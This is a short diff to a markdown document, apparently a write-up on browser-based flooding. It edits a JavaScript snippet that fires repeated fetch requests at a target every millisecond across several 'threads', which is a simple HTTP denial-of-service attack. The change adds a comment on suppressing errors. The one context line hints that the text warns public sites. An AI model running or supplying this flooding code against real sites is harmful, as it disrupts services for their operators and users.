@@ -10,7 +10,7 @@ This should also be taken in consideration by many public sites, as 5 lines of c
 ```javascript
 worker = setInterval(()=>{
     for(let i =0;i<threads;i++){
-        fetch(target).then(()=>{}).catch(()=>{})
+        fetch(target).then(()=>{}).catch(()=>{}) //callback is not required but prevents many errors.
     }
 },1)
 ```
